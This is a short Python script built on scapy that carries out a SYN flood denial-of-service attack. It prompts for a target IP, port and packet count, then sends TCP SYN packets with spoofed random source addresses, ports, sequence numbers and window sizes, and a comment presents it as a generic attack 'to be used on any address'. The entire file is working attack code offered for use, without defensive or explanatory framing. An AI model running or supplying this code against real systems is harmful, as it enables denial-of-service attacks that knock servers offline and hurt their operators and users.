from pip._vendor.distlib.compat import raw_input
from scapy.all import *
from scapy.layers.inet import IP, TCP
import os
import sys
import random


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def SYN_Flood(targetIP, targetPort, counter):
    total = 0 # total number of packets sent to the target
    print
    "Packets are being sent to the target ..."
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        # randomly generate all of these values (s_port, s_eq, w_indow using randInt() function

        IP_Packet = IP()
        IP_Packet.src = randomIP()

        # randomly generate IP address to be sending packets from

        IP_Packet.dst = targetIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = targetPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent to target : %i\n" % total)


def info():
    os.system("clear")

    # targetIP and targetPort are to be set to the IP and port of the server/client.
    # this attack is currently built as a generic SYN flood attack to be used on any address, dynamically

    targetIP = raw_input("\nPlease input the target IP : ")
    targetPort = input("Input the target Port : ")

    return targetIP, int(targetPort)


def main():
    dstIP, dstPort = info()
    counter = input("Please input how many packets do you want to send : ")
    SYN_Flood(dstIP, dstPort, int(counter))


main()